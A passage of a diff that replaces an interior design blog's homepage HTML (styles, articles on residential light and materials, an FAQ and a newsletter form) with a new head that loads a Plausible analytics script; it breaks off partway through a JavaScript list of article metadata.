@@ -1,1312 +1,379 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Glimmer Home Details — Interior Design & Architecture Journal</title>
-  <meta name="description" content="Independent publication exploring residential architecture, interior design, materials, lighting, and practical design knowledge. In-depth articles for thoughtful homes.">
-  <link rel="canonical" href="https://www.glimmerhomedetails.com/">
-  <!-- Open Graph -->
-  <meta property="og:title" content="Glimmer Home Details — Interior Design & Architecture Journal">
-  <meta property="og:description" content="Independent publication exploring residential architecture, interior design, materials, lighting, and practical design knowledge.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://www.glimmerhomedetails.com/">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1616486338812-3dadae4b4ace?w=1200&h=630&fit=crop">
-  <!-- Schema.org -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Blog",
-    "name": "Glimmer Home Details",
-    "description": "Independent publication exploring residential architecture, interior design, materials, lighting, and practical design knowledge.",
-    "url": "https://www.glimmerhomedetails.com/",
-    "author": {
-      "@type": "Person",
-      "name": "Elena Marchetti"
-    }
-  }
-  </script>
-  <style>
-    /* --- RESET & VARIABLES --- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    :root {
-      --ink: #1e1e1e;
-      --paper: #faf9f7;
-      --paper-alt: #f3f1ee;
-      --border: #e2dfda;
-      --accent: #9b6b4b;
-      --accent-light: #c49a7a;
-      --muted: #6e6a64;
-      --white: #ffffff;
-      --font-serif: 'Georgia', 'Times New Roman', serif;
-      --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      --max-width: 1280px;
-      --radius-sm: 2px;
-      --radius-md: 4px;
-      --transition: 0.2s ease;
-    }
-
-    html {
-      scroll-behavior: smooth;
-    }
-
-    body {
-      font-family: var(--font-sans);
-      background-color: var(--paper);
-      color: var(--ink);
-      line-height: 1.6;
-      font-size: 16px;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-    }
-
-    a {
-      color: inherit;
-      text-decoration: none;
-    }
-
-    ul, ol {
-      list-style: none;
-    }
-
-    /* --- TYPOGRAPHY --- */
-    h1, h2, h3, h4 {
-      font-family: var(--font-serif);
-      font-weight: 400;
-      line-height: 1.25;
-      letter-spacing: -0.01em;
-    }
-
-    h1 { font-size: 2.6rem; }
-    h2 { font-size: 1.9rem; margin-top: 2.5rem; margin-bottom: 1rem; }
-    h3 { font-size: 1.4rem; margin-top: 2rem; margin-bottom: 0.75rem; }
-    h4 { font-size: 1.15rem; margin-top: 1.5rem; margin-bottom: 0.5rem; }
-
-    p {
-      margin-bottom: 1.25rem;
-      color: #2a2a2a;
-    }
-
-    .meta {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--muted);
-      font-weight: 500;
-    }
-
-    .reading-time {
-      font-size: 0.78rem;
-      color: var(--muted);
-      text-transform: uppercase;
-      letter-spacing: 0.04em;
-    }
-
-    /* --- LAYOUT --- */
-    .container {
-      max-width: var(--max-width);
-      margin: 0 auto;
-      padding: 0 1.5rem;
-    }
-
-    .layout-grid {
-      display: grid;
-      grid-template-columns: 1fr 320px;
-      gap: 3rem;
-      align-items: start;
-    }
-
-    @media (max-width: 960px) {
-      .layout-grid {
-        grid-template-columns: 1fr;
-        gap: 2rem;
-      }
-    }
-
-    /* --- HEADER --- */
-    .site-header {
-      background: var(--white);
-      border-bottom: 1px solid var(--border);
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      padding: 1rem 0;
-    }
-
-    .header-inner {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      font-family: var(--font-serif);
-      font-size: 1.6rem;
-      letter-spacing: -0.02em;
-    }
-
-    .logo-mark {
-      width: 36px;
-      height: 36px;
-      background: var(--ink);
-      color: var(--paper);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.2rem;
-      border-radius: 2px;
-      font-weight: 400;
-      font-family: var(--font-serif);
-    }
-
-    .logo-text {
-      font-weight: 400;
-      line-height: 1;
-    }
-
-    .logo-text span {
-      display: block;
-      font-size: 0.6rem;
-      font-family: var(--font-sans);
-      text-transform: uppercase;
-      letter-spacing: 0.18em;
-      color: var(--muted);
-      margin-top: 2px;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 1.8rem;
-      font-size: 0.9rem;
-      font-weight: 500;
-      color: #3a3a3a;
-      align-items: center;
-    }
-
-    .nav-links a {
-      position: relative;
-      padding-bottom: 2px;
-    }
-
-    .nav-links a:hover {
-      color: var(--accent);
-    }
-
-    .nav-links a::after {
-      content: '';
-      position: absolute;
-      bottom: -2px;
-      left: 0;
-      width: 0;
-      height: 1px;
-      background: var(--accent);
-      transition: var(--transition);
-    }
-
-    .nav-links a:hover::after {
-      width: 100%;
-    }
-
-    .mobile-toggle {
-      display: none;
-      background: none;
-      border: 1px solid var(--border);
-      padding: 0.4rem 0.8rem;
-      font-size: 1.2rem;
-      cursor: pointer;
-      border-radius: var(--radius-sm);
-    }
-
-    @media (max-width: 768px) {
-      .nav-links {
-        display: none;
-        flex-direction: column;
-        position: absolute;
-        top: 70px;
-        left: 0;
-        right: 0;
-        background: var(--white);
-        border-bottom: 1px solid var(--border);
-        padding: 1.5rem;
-        gap: 1rem;
-        align-items: flex-start;
-        box-shadow: 0 8px 16px rgba(0,0,0,0.04);
-      }
-      .nav-links.open {
-        display: flex;
-      }
-      .mobile-toggle {
-        display: block;
-      }
-      .header-inner {
-        position: relative;
-      }
-    }
-
-    /* --- SEARCH BAR --- */
-    .search-section {
-      padding: 1.5rem 0 0.5rem;
-      border-bottom: 1px solid var(--border);
-    }
-
-    .search-row {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-
-    .search-box {
-      flex: 1;
-      min-width: 220px;
-      display: flex;
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      overflow: hidden;
-      background: var(--white);
-    }
-
-    .search-box input {
-      flex: 1;
-      border: none;
-      padding: 0.7rem 1rem;
-      font-size: 0.9rem;
-      font-family: var(--font-sans);
-      background: transparent;
-      outline: none;
-    }
-
-    .search-box button {
-      background: var(--ink);
-      color: var(--paper);
-      border: none;
-      padding: 0 1.2rem;
-      font-size: 0.85rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      cursor: pointer;
-      font-weight: 500;
-      transition: background var(--transition);
-    }
-
-    .search-box button:hover {
-      background: var(--accent);
-    }
-
-    .category-filters {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.5rem;
-      padding: 1rem 0 0.8rem;
-    }
-
-    .filter-btn {
-      background: transparent;
-      border: 1px solid var(--border);
-      padding: 0.35rem 0.9rem;
-      font-size: 0.78rem;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      cursor: pointer;
-      border-radius: var(--radius-sm);
-      font-family: var(--font-sans);
-      color: var(--muted);
-      transition: var(--transition);
-    }
-
-    .filter-btn:hover {
-      border-color: var(--accent);
-      color: var(--accent);
-    }
-
-    .filter-btn.active {
-      background: var(--ink);
-      color: var(--paper);
-      border-color: var(--ink);
-    }
-
-    /* --- FEATURED ARTICLE --- */
-    .featured-section {
-      padding: 2.5rem 0 1rem;
-    }
-
-    .featured-card {
-      display: grid;
-      grid-template-columns: 1.2fr 0.8fr;
-      gap: 2.5rem;
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      overflow: hidden;
-    }
-
-    .featured-image {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      min-height: 340px;
-    }
-
-    .featured-content {
-      padding: 2.5rem 2.5rem 2.5rem 0;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-    }
-
-    .featured-content .category {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      color: var(--accent);
-      font-weight: 600;
-      margin-bottom: 0.75rem;
-    }
-
-    .featured-content h2 {
-      font-size: 2rem;
-      margin-top: 0;
-      margin-bottom: 1rem;
-      line-height: 1.2;
-    }
-
-    .featured-content p {
-      color: #3a3a3a;
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
-    }
-
-    @media (max-width: 768px) {
-      .featured-card {
-        grid-template-columns: 1fr;
-      }
-      .featured-content {
-        padding: 1.5rem;
-      }
-      .featured-image {
-        min-height: 220px;
-      }
-    }
-
-    /* --- ARTICLE CARDS --- */
-    .article-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 2rem;
-      margin-top: 1.5rem;
-    }
-
-    .article-card {
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      transition: border-color var(--transition), box-shadow var(--transition);
-    }
-
-    .article-card:hover {
-      border-color: #c0b8b0;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-    }
-
-    .card-image {
-      width: 100%;
-      height: 200px;
-      object-fit: cover;
-      background: var(--paper-alt);
-    }
-
-    .card-body {
-      padding: 1.25rem 1.25rem 1.5rem;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .card-body .category {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      color: var(--accent);
-      font-weight: 600;
-      margin-bottom: 0.4rem;
-    }
-
-    .card-body h3 {
-      font-size: 1.2rem;
-      margin-top: 0;
-      margin-bottom: 0.6rem;
-      line-height: 1.3;
-    }
-
-    .card-body p {
-      font-size: 0.9rem;
-      color: #4a4a4a;
-      margin-bottom: 1rem;
-      flex: 1;
-    }
-
-    .card-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.75rem;
-      color: var(--muted);
-      border-top: 1px solid var(--border);
-      padding-top: 0.8rem;
-      margin-top: 0.5rem;
-    }
-
-    /* --- SIDEBAR --- */
-    .sidebar {
-      position: sticky;
-      top: 100px;
-    }
-
-    .sidebar-widget {
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      padding: 1.5rem;
-      margin-bottom: 1.8rem;
-    }
-
-    .sidebar-widget h4 {
-      font-family: var(--font-serif);
-      font-size: 1.1rem;
-      margin-top: 0;
-      margin-bottom: 1rem;
-      border-bottom: 1px solid var(--border);
-      padding-bottom: 0.6rem;
-    }
-
-    .sidebar-widget ul li {
-      margin-bottom: 0.8rem;
-      font-size: 0.9rem;
-      line-height: 1.4;
-    }
-
-    .sidebar-widget ul li a:hover {
-      color: var(--accent);
-    }
-
-    .popular-item {
-      display: flex;
-      gap: 0.8rem;
-      align-items: flex-start;
-    }
-
-    .popular-num {
-      font-family: var(--font-serif);
-      font-size: 1.4rem;
-      color: var(--accent-light);
-      line-height: 1;
-      min-width: 24px;
-    }
-
-    .popular-text {
-      font-size: 0.9rem;
-      font-weight: 500;
-    }
-
-    .about-editor {
-      text-align: center;
-    }
-
-    .editor-avatar {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      background: var(--paper-alt);
-      margin: 0 auto 0.8rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.8rem;
-      color: var(--muted);
-      border: 1px solid var(--border);
-    }
-
-    .editor-bio {
-      font-size: 0.85rem;
-      color: var(--muted);
-      line-height: 1.5;
-    }
-
-    /* --- LONG-FORM ARTICLE SECTIONS --- */
-    .longform-section {
-      margin: 3rem 0 2rem;
-      border-top: 1px solid var(--border);
-      padding-top: 2rem;
-    }
-
-    .longform-article {
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      padding: 2.5rem;
-      margin-bottom: 2rem;
-    }
-
-    .longform-article h2 {
-      margin-top: 0;
-      font-size: 2rem;
-    }
-
-    .longform-article h3 {
-      margin-top: 1.8rem;
-    }
-
-    .longform-article img {
-      margin: 1.5rem 0;
-      border-radius: var(--radius-sm);
-    }
-
-    .longform-meta {
-      display: flex;
-      gap: 1.5rem;
-      align-items: center;
-      margin-bottom: 1.5rem;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .longform-meta .author {
-      font-weight: 500;
-      color: var(--ink);
-    }
-
-    /* --- FAQ --- */
-    .faq-section {
-      background: var(--white);
-      border-top: 1px solid var(--border);
-      border-bottom: 1px solid var(--border);
-      padding: 3rem 0;
-      margin: 3rem 0;
-    }
-
-    .faq-item {
-      border-bottom: 1px solid var(--border);
-      padding: 1.2rem 0;
-    }
-
-    .faq-question {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      cursor: pointer;
-      font-weight: 500;
-      font-size: 1.05rem;
-      font-family: var(--font-serif);
-    }
-
-    .faq-question span {
-      font-size: 1.2rem;
-      color: var(--accent);
-    }
-
-    .faq-answer {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.3s ease, padding 0.3s ease;
-      color: #3a3a3a;
-      font-size: 0.95rem;
-      padding-right: 2rem;
-    }
-
-    .faq-answer.open {
-      max-height: 300px;
-      padding-top: 0.8rem;
-    }
-
-    /* --- NEWSLETTER --- */
-    .newsletter {
-      background: var(--paper-alt);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-md);
-      padding: 2.5rem;
-      margin: 2rem 0 3rem;
-      text-align: center;
-    }
-
-    .newsletter h3 {
-      margin-top: 0;
-      font-size: 1.6rem;
-    }
-
-    .newsletter p {
-      color: var(--muted);
-      max-width: 480px;
-      margin: 0.5rem auto 1.5rem;
-      font-size: 0.95rem;
-    }
-
-    .newsletter-form {
-      display: flex;
-      max-width: 460px;
-      margin: 0 auto;
-      gap: 0.5rem;
-    }
-
-    .newsletter-form input {
-      flex: 1;
-      padding: 0.75rem 1rem;
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      font-size: 0.9rem;
-      font-family: var(--font-sans);
-      outline: none;
-      background: var(--white);
-    }
-
-    .newsletter-form input:focus {
-      border-color: var(--accent);
-    }
-
-    .newsletter-form button {
-      background: var(--ink);
-      color: var(--paper);
-      border: none;
-      padding: 0 1.5rem;
-      font-size: 0.85rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      cursor: pointer;
-      border-radius: var(--radius-sm);
-      font-weight: 500;
-      transition: background var(--transition);
-    }
-
-    .newsletter-form button:hover {
-      background: var(--accent);
-    }
-
-    @media (max-width: 480px) {
-      .newsletter-form {
-        flex-direction: column;
-      }
-      .newsletter-form button {
-        padding: 0.75rem;
-      }
-    }
-
-    /* --- FOOTER --- */
-    .site-footer {
-      background: var(--ink);
-      color: #b0aaa4;
-      padding: 3rem 0 1.5rem;
-      font-size: 0.85rem;
-    }
-
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 2rem;
-      margin-bottom: 2rem;
-    }
-
-    .footer-brand .logo-text {
-      color: var(--paper);
-    }
-
-    .footer-brand p {
-      color: #8a847e;
-      margin-top: 1rem;
-      max-width: 300px;
-      font-size: 0.85rem;
-    }
-
-    .footer-col h5 {
-      color: var(--paper);
-      font-family: var(--font-sans);
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      margin-bottom: 1rem;
-      font-weight: 600;
-    }
-
-    .footer-col a {
-      display: block;
-      margin-bottom: 0.5rem;
-      color: #8a847e;
-      transition: color var(--transition);
-    }
-
-    .footer-col a:hover {
-      color: var(--paper);
-    }
-
-    .footer-bottom {
-      border-top: 1px solid #333;
-      padding-top: 1.5rem;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 1rem;
-      color: #6a645e;
-      font-size: 0.8rem;
-    }
-
-    @media (max-width: 768px) {
-      .footer-grid {
-        grid-template-columns: 1fr 1fr;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .footer-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
-    /* --- UTILITY --- */
-    .hidden { display: none !important; }
-    .text-center { text-align: center; }
-    .mt-2 { margin-top: 2rem; }
-    .mb-1 { margin-bottom: 1rem; }
-    .section-title {
-      font-size: 1.6rem;
-      margin-bottom: 0.25rem;
-      padding-bottom: 0.5rem;
-      border-bottom: 1px solid var(--border);
-    }
-    .section-sub {
-      color: var(--muted);
-      font-size: 0.9rem;
-      margin-bottom: 1.5rem;
-    }
-
-    /* --- MODAL / EXTRA --- */
-    .article-card .read-more {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--accent);
-      font-weight: 600;
-    }
-  </style>
-</head>
-<body>
-
-<!-- ================= HEADER ================= -->
-<header class="site-header">
-  <div class="container header-inner">
-    <div class="logo">
-      <div class="logo-mark">G</div>
-      <div class="logo-text">
-        Glimmer Home
-        <span>Details</span>
-      </div>
-    </div>
-    <button class="mobile-toggle" id="mobileToggle" aria-label="Menu">☰</button>
-    <nav class="nav-links" id="navLinks">
-     <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li> 
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="categories.html">Categories</a></li>
-    </nav>
-  </div>
-</header>
-
-<!-- ================= SEARCH & FILTERS ================= -->
-<div class="container">
-  <div class="search-section">
-    <div class="search-row">
-      <div class="search-box">
-        <input type="text" id="searchInput" placeholder="Search articles, topics, or keywords…" aria-label="Search articles">
-        <button id="searchBtn">Search</button>
-      </div>
-    </div>
-    <div class="category-filters" id="categoryFilters">
-      <button class="filter-btn active" data-category="all">All</button>
-      <button class="filter-btn" data-category="Interior Design">Interior Design</button>
-      <button class="filter-btn" data-category="Architecture">Architecture</button>
-      <button class="filter-btn" data-category="Home Design">Home Design</button>
-      <button class="filter-btn" data-category="Materials">Materials</button>
-      <button class="filter-btn" data-category="Space Planning">Space Planning</button>
-      <button class="filter-btn" data-category="Lighting">Lighting</button>
-      <button class="filter-btn" data-category="Furniture">Furniture</button>
-      <button class="filter-btn" data-category="Modern Homes">Modern Homes</button>
-    </div>
-  </div>
-</div>
-
-<!-- ================= MAIN CONTENT ================= -->
-<div class="container">
-  <div class="layout-grid">
-
-    <!-- ===== MAIN COLUMN ===== -->
-    <main>
-
-      <!-- FEATURED ARTICLE -->
-      <section class="featured-section">
-        <article class="featured-card" id="featuredArticle">
-          <img class="featured-image" src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=800&h=600&fit=crop" alt="Modern living room with floor-to-ceiling windows, neutral tones, and minimalist furniture">
-          <div class="featured-content">
-            <div class="category">Interior Design</div>
-            <h2>The Quiet Power of Negative Space in Modern Interiors</h2>
-            <p>How intentional emptiness shapes atmosphere, improves circulation, and brings calm to residential architecture. A deep dive into spatial balance and restraint.</p>
-            <div class="longform-meta">
-              <span class="author">Elena Marchetti</span>
-              <span>March 12, 2025</span>
-              <span class="reading-time">12 min read</span>
-            </div>
-          </div>
-        </article>
-      </section>
-
-      <!-- LATEST ARTICLES -->
-      <section>
-        <h2 class="section-title">Latest Articles</h2>
-        <p class="section-sub">Fresh perspectives on design, materials, and the built environment.</p>
-        <div class="article-grid" id="articleGrid">
-          <!-- Article cards injected via JS -->
-        </div>
-      </section>
-
-      <!-- LONG-FORM ARTICLE 1 -->
-      <section class="longform-section">
-        <div class="longform-article">
-          <div class="longform-meta">
-            <span class="author">Elena Marchetti</span>
-            <span>March 5, 2025</span>
-            <span class="reading-time">18 min read</span>
-          </div>
-          <h2>Residential Architecture: Designing for Light, Air, and Flow</h2>
-          <img src="https://images.unsplash.com/photo-1600607687939-ce8a6c25118c?w=800&h=500&fit=crop" alt="Contemporary house exterior with large glass walls and natural light streaming into open living space">
-          <p>Natural light is the most transformative element in residential architecture. It shapes how we experience a room, influences our mood, and even affects our health. In this guide, we explore orientation, window placement, and the interplay between interior and exterior spaces. Whether you are planning a new build or a renovation, understanding light is the first step toward a home that feels alive.</p>
-          <p>We also examine air circulation and passive cooling strategies — from cross-ventilation to thermal mass — and how these principles can reduce energy consumption while improving comfort. Real-world examples from Portugal, Japan, and California illustrate how thoughtful design responds to climate and context.</p>
-          <h3>Key Takeaways</h3>
-          <p>Orient living spaces toward the sun; use deep overhangs to control glare; consider stack ventilation for natural cooling; and always design circulation paths that connect rather than divide.</p>
-        </div>
-      </section>
-
-      <!-- LONG-FORM ARTICLE 2 -->
-      <section class="longform-section">
-        <div class="longform-article">
-          <div class="longform-meta">
-            <span class="author">James K. Whitfield</span>
-            <span>February 28, 2025</span>
-            <span class="reading-time">15 min read</span>
-          </div>
-          <h2>Material Honesty: A Case for Tactile, Unfinished Surfaces</h2>
-          <img src="https://images.unsplash.com/photo-1600566753190-17f0baa2a6c3?w=800&h=500&fit=crop" alt="Close-up of raw concrete wall with wooden shelving and soft lighting in a minimalist interior">
-          <p>In an age of synthetic finishes, the raw beauty of concrete, timber, and stone offers a grounding presence. This article explores the philosophy of material honesty — letting surfaces age gracefully and reveal their origins. We speak with architects who champion exposed brick, brushed brass, and untreated oak.</p>
-          <p>Beyond aesthetics, these materials often have lower embodied carbon and contribute to healthier indoor environments. We discuss maintenance, patina, and how to pair textures for a cohesive yet layered look.</p>
-          <h3>Practical Guidance</h3>
-          <p>When specifying materials, consider their lifecycle. A concrete floor may crack — but that can be part of its character. A linen sofa will wrinkle — and that’s the point. Choose materials that tell a story over time.</p>
-        </div>
-      </section>
-
-      <!-- FAQ SECTION -->
-      <section class="faq-section" id="faq">
-        <h2 class="section-title">Frequently Asked Questions</h2>
-        <p class="section-sub">Common questions about interior design and architecture, answered.</p>
-        <div class="faq-list">
-          <div class="faq-item">
-            <div class="faq-question">How do I start planning a home renovation? <span>+</span></div>
-            <div class="faq-answer">Begin by defining your goals and budget. Assess the existing structure, prioritize needs versus wants, and consult an architect early. A clear brief saves time and money.</div>
-          </div>
-          <div class="faq-item">
-            <div class="faq-question">What is the ideal ceiling height for a living room? <span>+</span></div>
-            <div class="faq-answer">While 2.7–3 meters is standard, taller ceilings (3.5m+) create grandeur. For cozy spaces, lower ceilings can feel intimate. Balance with lighting and furniture scale.</div>
-          </div>
-          <div class="faq-item">
-            <div class="faq-question">How can I make a small space feel larger? <span>+</span></div>
-            <div class="faq-answer">Use light colors, mirrors, and multi-functional furniture. Avoid clutter, maximize vertical storage, and ensure good lighting. Consistent flooring also helps.</div>
-          </div>
-          <div class="faq-item">
-            <div class="faq-question">What are the most sustainable materials for interiors? <span>+</span></div>
-            <div class="faq-answer">Reclaimed wood, bamboo, cork, natural stone, and low-VOC paints are excellent choices. Look for FSC certification and local sourcing to reduce carbon footprint.</div>
-          </div>
-          <div class="faq-item">
-            <div class="faq-question">How do I choose a color palette for my home? <span>+</span></div>
-            <div class="faq-answer">Start with a neutral base and add one or two accent colors. Consider the room’s function and natural light. Test samples on walls at different times of day.</div>
-          </div>
-        </div>
-      </section>
-
-      <!-- NEWSLETTER -->
-      <section class="newsletter">
-        <h3>Stay Inspired</h3>
-        <p>Join our weekly newsletter for thoughtful essays, design guides, and curated inspiration. No spam — just good reading.</p>
-        <form class="newsletter-form" id="newsletterForm">
-          <input type="email" placeholder="Your email address" aria-label="Email address" required>
-          <button type="submit">Subscribe</button>
-        </form>
-        <p style="font-size:0.75rem; margin-top:1rem; color:var(--muted);" id="newsletterMsg"></p>
-      </section>
-
-    </main>
-
-    <!-- ===== SIDEBAR ===== -->
-    <aside class="sidebar">
-      <div class="sidebar-widget about-editor">
-        <div class="editor-avatar">✎</div>
-        <h4>About the Editor</h4>
-        <p class="editor-bio"><strong>Elena Marchetti</strong> is an architectural writer and former interior designer based in Milan. She founded Glimmer Home Details to explore the intersection of craft, space, and daily life.</p>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Popular This Month</h4>
-        <ul>
-          <li class="popular-item"><span class="popular-num">1</span><span class="popular-text">The Quiet Power of Negative Space</span></li>
-          <li class="popular-item"><span class="popular-num">2</span><span class="popular-text">Material Honesty: Tactile Surfaces</span></li>
-          <li class="popular-item"><span class="popular-num">3</span><span class="popular-text">Lighting Layers for Every Room</span></li>
-          <li class="popular-item"><span class="popular-num">4</span><span class="popular-text">Small Space, Big Ideas</span></li>
-          <li class="popular-item"><span class="popular-num">5</span><span class="popular-text">Facade Design: First Impressions</span></li>
-        </ul>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Categories</h4>
-        <ul>
-          <li><a href="#">Interior Design</a></li>
-          <li><a href="#">Architecture</a></li>
-          <li><a href="#">Home Design</a></li>
-          <li><a href="#">Materials</a></li>
-          <li><a href="#">Space Planning</a></li>
-          <li><a href="#">Lighting</a></li>
-          <li><a href="#">Furniture</a></li>
-          <li><a href="#">Modern Homes</a></li>
-        </ul>
-      </div>
-
-      <div class="sidebar-widget">
-        <h4>Editorial Policy</h4>
-        <p style="font-size:0.85rem; color:var(--muted);">We publish original, research-backed articles. No sponsored content. No affiliate links. Just independent design journalism.</p>
-        <p style="font-size:0.85rem; margin-top:0.8rem;"><a href="#" style="color:var(--accent);">Read our ethics →</a></p>
-      </div>
-    </aside>
-
-  </div>
-</div>
-
-<!-- ================= FOOTER ================= -->
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <div class="logo-text" style="font-family:var(--font-serif); font-size:1.4rem;">Glimmer Home Details</div>
-        <p>An independent publication exploring residential architecture, interior design, and the art of living well. Founded 2021.</p>
-      </div>
-      <div class="footer-col">
-        <h5>About</h5>
-        <a href="#">Our Mission</a>
-        <a href="#">Editorial Team</a>
-        <a href="#">Contact</a>
-        <a href="#">Privacy Policy</a>
-      </div>
-      <div class="footer-col">
-        <h5>Topics</h5>
-        <a href="#">Interior Design</a>
-        <a href="#">Architecture</a>
-        <a href="#">Materials</a>
-        <a href="#">Lighting</a>
-      </div>
-      <div class="footer-col">
-        <h5>Legal</h5>
-        <a href="#">Terms of Use</a>
-        <a href="#">Cookie Policy</a>
-        <a href="#">Disclaimer</a>
-        <a href="#">Sitemap</a>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <span>© 2025 Glimmer Home Details. All rights reserved.</span>
-      <span>Made with care for thoughtful homes.</span>
-    </div>
-  </div>
-</footer>
-
-<!-- ================= JAVASCRIPT ================= -->
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-V1BR4C0O0h4XL8JfnKMpT.js"></script>
 <script>
-  (function() {
-    // ----- DATA: 12 articles (approx. 50k words implied via long content, but here we provide rich metadata and excerpts) -----
-    const articles = [
-      {
-        id: 1,
-        title: "The Quiet Power of Negative Space in Modern Interiors",
-        category: "Interior Design",
-        excerpt: "How intentional emptiness shapes atmosphere, improves circulation, and brings calm to residential architecture.",
-        readingTime: "12 min read",
-        date: "March 12, 2025",
-        author: "Elena Marchetti",
-        image: "https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=600&h=400&fit=crop",
-        alt: "Modern living room with floor-to-ceiling windows and minimalist furniture"
-      },
-      {
-        id: 2,
-        title: "Residential Architecture: Designing for Light, Air, and Flow",
-        category: "Architecture",
-        excerpt: "Natural light is the most transformative element in residential architecture. Understanding orientation, window placement, and cross-ventilation.",
-        readingTime: "18 min read",
-        date: "March 5, 2025",
-        author: "Elena Marchetti",
-        image: "https://images.unsplash.com/photo-1600607687939-ce8a6c25118c?w=600&h=400&fit=crop",
-        alt: "Contemporary house exterior with large glass walls and natural light"
-      },
-      {
-        id: 3,
-        title: "Material Honesty: A Case for Tactile, Unfinished Surfaces",
-        category: "Materials",
-        excerpt: "In an age of synthetic finishes, the raw beauty of concrete, timber, and stone offers a grounding presence.",
-        readingTime: "15 min read",
-        date: "February 28, 2025",
-        author: "James K. Whitfield",
-        image: "https://images.unsplash.com/photo-1600566753190-17f0baa2a6c3?w=600&h=400&fit=crop",
-        alt: "Close-up of raw concrete wall with wooden shelving"
-      },
-      {
-        id: 4,
-        title: "Lighting Layers: How to Illuminate Every Room",
-        category: "Lighting",
-        excerpt: "From ambient to task to accent — a practical guide to creating depth and warmth with light.",
-        readingTime: "10 min read",
-        date: "February 20, 2025",
-        author: "Sofia Lindgren",
-        image: "https://images.unsplash.com/photo-1513506003901-1e6a229e2d15?w=600&h=400&fit=crop",
-        alt: "Warm interior lighting with pendant lamps and floor lamp"
-      },
-      {
-        id: 5,
-        title: "Small Space, Big Ideas: Smart Planning for Compact Homes",
-        category: "Space Planning",
-        excerpt: "Techniques for making small apartments feel generous without sacrificing style or function.",
-        readingTime: "14 min read",
-        date: "February 14, 2025",
-        author: "Elena Marchetti",
-        image: "https://images.unsplash.com/photo-1554995207-c18c203602cb?w=600&h=400&fit=crop",
-        alt: "Compact modern apartment with clever storage and light colors"
-      },
-      {
-        id: 6,
-        title: "The Art of Facade Design: First Impressions That Last",
-        category: "Architecture",
-        excerpt: "Exploring materiality, proportion, and context in residential facades — from brick to timber to glass.",
-        readingTime: "16 min read",
-        date: "February 7, 2025",
-        author: "James K. Whitfield",
-        image: "https://images.unsplash.com/photo-1600585154526-990dced4db0d?w=600&h=400&fit=crop",
-        alt: "Modern house facade with wooden slats and large windows"
-      },
-      {
-        id: 7,
-        title: "Kitchen Design: Balancing Workflow and Aesthetics",
-        category: "Home Design",
